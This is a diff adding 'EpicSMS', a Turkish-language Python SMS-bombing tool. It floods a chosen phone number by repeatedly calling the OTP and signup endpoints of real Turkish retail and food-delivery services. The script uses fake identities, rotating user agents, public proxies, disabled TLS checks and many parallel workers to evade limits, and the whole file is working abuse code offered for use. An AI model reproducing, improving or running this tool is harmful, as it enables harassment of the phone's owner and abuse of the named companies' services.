@@ -1,0 +1,290 @@
+# -*- coding: utf-8 -*-
+
+import subprocess
+import sys
+import os
+import asyncio
+import aiohttp
+import logging
+import re
+import random
+import time
+import sqlite3
+import threading
+from datetime import datetime
+import colorama
+from colorama import Fore, Style
+import coloredlogs
+from faker import Faker
+import urllib.parse
+import json
+import uuid
+from tqdm import tqdm
+import requests
+from fake_useragent import UserAgent
+
+# Gerekli modüllerin kontrolü ve kurulumu
+required_modules = ["aiohttp", "faker", "colorama", "coloredlogs", "tqdm", "requests", "fake-useragent"]
+for module in required_modules:
+    try:
+        __import__(module)
+    except ImportError:
+        print(f"EpicSMS: {module} indiriliyor...")
+        subprocess.check_call([sys.executable, "-m", "pip", "install", module])
+
+# Başlatma
+colorama.init()
+faker = Faker()
+ua = UserAgent()
+LANGUAGE = "TR"
+
+# Global değişkenler
+all_sends = 0
+success_sends = 0
+failed_sends = 0
+running = False
+
+# Log ayarları
+logging.basicConfig(filename='epicsms_log.txt', level=logging.INFO, format='%(asctime)s - EpicSMS - %(message)s')
+coloredlogs.install(level='INFO', fmt='%(asctime)s - EpicSMS - [%(levelname)s] %(message)s')
+
+# Veritabanı başlatma
+db_path = os.path.join(os.getcwd(), 'api_status.db')
+conn = sqlite3.connect(db_path)
+c = conn.cursor()
+c.execute('''CREATE TABLE IF NOT EXISTS apis (name TEXT PRIMARY KEY, success INT, failure INT)''')
+conn.commit()
+
+# Telefon numarası doğrulama
+def validate_phone_number(phone):
+    phone = str(phone).strip()
+    if not re.match(r'^\d{10}$', phone) or phone[0] != '5':
+        raise ValueError("Geçersiz numara! 10 hane ve 5 ile başlamalı (örn: 5551234567)")
+    return f"90{phone}"
+
+# Proxy listesi çekme
+def fetch_proxies():
+    try:
+        response = requests.get("https://www.proxy-list.download/api/v1/get?type=https")
+        return [line.strip() for line in response.text.split('\n') if line.strip()]
+    except Exception as e:
+        logging.error(f"Proxy listesi çekilemedi: {e}")
+        return []
+
+# SMS Sağlayıcı Sınıfı
+class SMSProvider:
+    def __init__(self, name, url, payload_func, success_condition, method="POST", headers=None, cooldown=0):
+        self.name = name
+        self.url = url
+        self.payload_func = payload_func
+        self.success_condition = success_condition
+        self.method = method
+        self.headers = headers or {}
+        self.cooldown = cooldown
+        self.last_used = 0
+        self.disabled = False
+
+# Payload Fonksiyonları (Çalışan API’ler)
+def kigili_payload(n): return {"first_name": faker.first_name(), "last_name": faker.last_name(), "email": faker.email(), "phone": f"0{n[2:]}", "password": "nwejkfıower32", "confirm": "true", "kvkk": "true", "next": ""}
+def trendyol_payload(n): return {"phoneNumber": f"90{n[2:]}"}
+def getir_payload(n): return {"user": {"phone_number": f"+90{n[2:5]} {n[5:8]} {n[8:12]}"}}
+def yemeksepeti_payload(n): return {"phone": f"0{n[2:]}", "type": 1}
+def hepsiburada_payload(n): return {"mobilePhoneNumber": f"90{n[2:]}"}
+def defacto_payload(n): return {"mobilePhone": f"0{n[2:]}"}
+def migros_payload(n): return {"phoneNumber": n[2:]}
+def a101_payload(n): return {"phone": f"0{n[2:]}", "next": "/a101-kapida"}
+def coffy_payload(n): return {"phoneNumber": f"+90{n[2:]}"}
+def englishhome_payload(n): return {"first_name": faker.first_name(), "last_name": faker.last_name(), "email": faker.email(), "phone": f"0{n[2:]}", "password": "nwejkfıower32", "email_allowed": False, "sms_allowed": False, "confirm": True, "tom_pay_allowed": True}
+
+# Başarı Koşulları
+def default_condition(r): return r.status in [200, 201, 202, 204, 205]
+def trendyol_condition(r): return "isSuccess" in r.text
+def getir_condition(r): return r.status == 200
+def yemeksepeti_condition(r): return "success" in r.text
+def hepsiburada_condition(r): return r.status == 200
+def defacto_condition(r): return "IsSMSSend" in r.text
+def migros_condition(r): return "successful" in r.text
+def coffy_condition(r): return "success" in r.text
+def englishhome_condition(r): return r.status == 202
+
+# Sağlayıcı Listesi (2025’te Çalışanlar)
+epicsms_providers = [
+    SMSProvider("Kigili", "https://www.kigili.com/users/registration/", kigili_payload, default_condition, headers={"Content-Type": "application/x-www-form-urlencoded"}, cooldown=5),
+    SMSProvider("Trendyol", "https://public.trendyol.com/discovery-web-socialapi-service/api/social/signup/send-otp", trendyol_payload, trendyol_condition, headers={"Content-Type": "application/json"}, cooldown=5),
+    SMSProvider("Getir", "https://food-client-api.glovoapp.com/authentication/signup", getir_payload, getir_condition, headers={"Content-Type": "application/json"}, cooldown=5),
+    SMSProvider("Yemeksepeti", "https://api.yemeksepeti.com/v13/user/request-otp", yemeksepeti_payload, yemeksepeti_condition, headers={"x-platform": "android", "Content-Type": "application/json"}, cooldown=5),
+    SMSProvider("Hepsiburada", "https://www.hepsiburada.com/api/v1/otp-code/send", hepsiburada_payload, hepsiburada_condition, headers={"Content-Type": "application/json"}, cooldown=5),
+    SMSProvider("Defacto", "https://www.defacto.com.tr/Customer/SendPhoneConfirmationSms", defacto_payload, defacto_condition, headers={"Content-Type": "application/json"}, cooldown=5),
+    SMSProvider("Migros", "https://rest.migros.com.tr/sanalmarket/users/login/otp", migros_payload, migros_condition, headers={"Content-Type": "application/json"}, cooldown=5),
+    SMSProvider("A101", "https://www.a101.com.tr/users/otp-login/", a101_payload, default_condition, headers={"Content-Type": "application/json"}, cooldown=5),
+    SMSProvider("Coffy", "https://prod-api-mobile.coffy.com.tr/Account/Account/SendVerificationCode", coffy_payload, coffy_condition, headers={"Content-Type": "application/json"}, cooldown=5),
+    SMSProvider("EnglishHome", "https://www.englishhome.com/enh_app/users/registration/", englishhome_payload, englishhome_condition, headers={"Content-Type": "application/json"}, cooldown=5),
+]
+
+# SMS Gönderme (Thread ile)
+def send_sms_sync(phone_number, provider, proxy_list):
+    global all_sends, success_sends, failed_sends
+    if provider.disabled:
+        logging.info(f"{provider.name} devre dışı, atlanıyor.")
+        return
+    if provider.last_used and (time.time() - provider.last_used < provider.cooldown):
+        time.sleep(provider.cooldown - (time.time() - provider.last_used))
+    provider.last_used = time.time()
+    all_sends += 1
+
+    url = provider.url.format(phone_number=phone_number) if "{phone_number}" in provider.url else provider.url
+    payload = provider.payload_func(phone_number)
+    headers = provider.headers.copy()
+    headers["User-Agent"] = ua.random
+
+    logging.info(f"Gönderiliyor: {provider.name} -> {phone_number}")
+    try:
+        proxy = random.choice(proxy_list) if proxy_list and all_sends % 10 == 0 else None
+        if proxy:
+            logging.info(f"Proxy kullanılıyor: {proxy}")
+        
+        with requests.Session() as session:
+            if provider.method == "GET":
+                response = session.get(url, headers=headers, proxies={"https": proxy} if proxy else None, verify=False)
+            else:
+                response = session.post(url, headers=headers, json=payload if "application/json" in headers.get("Content-Type", "") else None, data=payload if "application/x-www-form-urlencoded" in headers.get("Content-Type", "") else None, proxies={"https": proxy} if proxy else None, verify=False)
+
+        if provider.success_condition(response):
+            success_sends += 1
+            logging.info(f"Başarılı: {provider.name} -> {phone_number} - Status: {response.status_code}")
+            c.execute("INSERT OR REPLACE INTO apis (name, success, failure) VALUES (?, COALESCE((SELECT success FROM apis WHERE name = ?), 0) + 1, COALESCE((SELECT failure FROM apis WHERE name = ?), 0))", (provider.name, provider.name, provider.name))
+        else:
+            failed_sends += 1
+            logging.warning(f"Başarısız: {provider.name} -> {phone_number} - Status: {response.status_code} - Yanıt: {response.text}")
+            c.execute("INSERT OR REPLACE INTO apis (name, success, failure) VALUES (?, COALESCE((SELECT success FROM apis WHERE name = ?), 0), COALESCE((SELECT failure FROM apis WHERE name = ?), 0) + 1)", (provider.name, provider.name, provider.name))
+
+    except Exception as e:
+        failed_sends += 1
+        logging.error(f"Hata: {provider.name} -> {phone_number} - {str(e)}")
+        if "timeout" in str(e) or "connection" in str(e):
+            provider.disabled = True
+            logging.info(f"{provider.name} devre dışı, 60 saniye bekleniyor.")
+            time.sleep(60)
+            provider.disabled = False
+
+    conn.commit()
+
+# Async SMS Gönderme (Worker ile)
+async def send_sms_async(phone_number, provider, session, proxy_list):
+    global all_sends, success_sends, failed_sends
+    if provider.disabled:
+        return
+    if provider.last_used and (time.time() - provider.last_used < provider.cooldown):
+        await asyncio.sleep(provider.cooldown - (time.time() - provider.last_used))
+    provider.last_used = time.time()
+    all_sends += 1
+
+    url = provider.url.format(phone_number=phone_number) if "{phone_number}" in provider.url else provider.url
+    payload = provider.payload_func(phone_number)
+    headers = provider.headers.copy()
+    headers["User-Agent"] = ua.random
+
+    try:
+        proxy = random.choice(proxy_list) if proxy_list and all_sends % 10 == 0 else None
+        if provider.method == "GET":
+            response = await session.get(url, headers=headers, proxy=proxy, ssl=False)
+        else:
+            response = await session.post(url, headers=headers, json=payload if "application/json" in headers.get("Content-Type", "") else None, data=payload if "application/x-www-form-urlencoded" in headers.get("Content-Type", "") else None, proxy=proxy, ssl=False)
+
+        response_text = await response.text()
+        if provider.success_condition(response):
+            success_sends += 1
+            logging.info(f"Başarılı: {provider.name} -> {phone_number} - Status: {response.status}")
+            c.execute("INSERT OR REPLACE INTO apis (name, success, failure) VALUES (?, COALESCE((SELECT success FROM apis WHERE name = ?), 0) + 1, COALESCE((SELECT failure FROM apis WHERE name = ?), 0))", (provider.name, provider.name, provider.name))
+        else:
+            failed_sends += 1
+            logging.warning(f"Başarısız: {provider.name} -> {phone_number} - Status: {response.status} - Yanıt: {response_text}")
+            c.execute("INSERT OR REPLACE INTO apis (name, success, failure) VALUES (?, COALESCE((SELECT success FROM apis WHERE name = ?), 0), COALESCE((SELECT failure FROM apis WHERE name = ?), 0) + 1)", (provider.name, provider.name, provider.name))
+
+    except Exception as e:
+        failed_sends += 1
+        logging.error(f"Hata: {provider.name} -> {phone_number} - {str(e)}")
+
+    conn.commit()
+
+# Thread Worker
+def thread_worker(phone_number, providers, proxy_list, interval):
+    while running:
+        random.shuffle(providers)
+        for provider in providers:
+            if not running:
+                break
+            send_sms_sync(phone_number, provider, proxy_list)
+            time.sleep(interval)
+
+# Async Worker
+async def async_worker(phone_number, providers, proxy_list, interval):
+    async with aiohttp.ClientSession() as session:
+        while running:
+            random.shuffle(providers)
+            for provider in providers:
+                if not running:
+                    break
+                await send_sms_async(phone_number, provider, session, proxy_list)
+                await asyncio.sleep(interval)
+
+# Ana Çalıştırma
+async def start_spam(phone_number, amount, worker_amount, thread_amount, interval, use_proxy):
+    global running
+    running = True
+    proxy_list = fetch_proxies() if use_proxy else []
+    tasks = []
+    threads = []
+    providers = epicsms_providers.copy()
+
+    logging.info(f"Başlatılıyor: {worker_amount} worker, {thread_amount} thread, {amount} SMS, {interval} saniye aralık")
+    with tqdm(total=amount, desc="EpicSMS İlerleme", unit="SMS") as pbar:
+        # Async Worker’lar
+        for _ in range(min(worker_amount, amount)):
+            task = asyncio.create_task(async_worker(phone_number, providers, proxy_list, interval))
+            tasks.append(task)
+
+        # Thread’ler
+        for _ in range(min(thread_amount, amount)):
+            t = threading.Thread(target=thread_worker, args=(phone_number, providers, proxy_list, interval))
+            t.start()
+            threads.append(t)
+
+        while running and all_sends < amount:
+            pbar.update(all_sends - pbar.n)
+            await asyncio.sleep(1)
+
+        running = False
+        for task in tasks:
+            task.cancel()
+        for t in threads:
+            t.join()
+
+    print(f"\nToplam Gönderim: {all_sends} | Başarılı: {success_sends} | Başarısız: {failed_sends}")
+
+# Giriş
+def main():
+    print(Fore.CYAN + "=== EpicSMS - SMS Gönderme Aracı ===" + Style.RESET_ALL)
+    phone_number = input("Telefon numarası (örn: 5551234567): ")
+    try:
+        phone_number = validate_phone_number(phone_number)
+    except ValueError as e:
+        print(Fore.RED + str(e) + Style.RESET_ALL)
+        return
+
+    amount = int(input("Gönderilecek SMS miktarı: "))
+    worker_amount = int(input("Worker sayısı (önerilen: 5-10): "))
+    thread_amount = int(input("Thread sayısı (önerilen: 5-10): "))
+    interval = float(input("Gönderim aralığı (saniye): "))
+    use_proxy = input("Proxy kullanmak ister misiniz? [E/H]: ").lower() == "e"
+
+    asyncio.run(start_spam(phone_number, amount, worker_amount, thread_amount, interval, use_proxy))
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        running = False
+        print(Fore.YELLOW + "\nDurduruldu!" + Style.RESET_ALL)
+    finally:
+        conn.close()
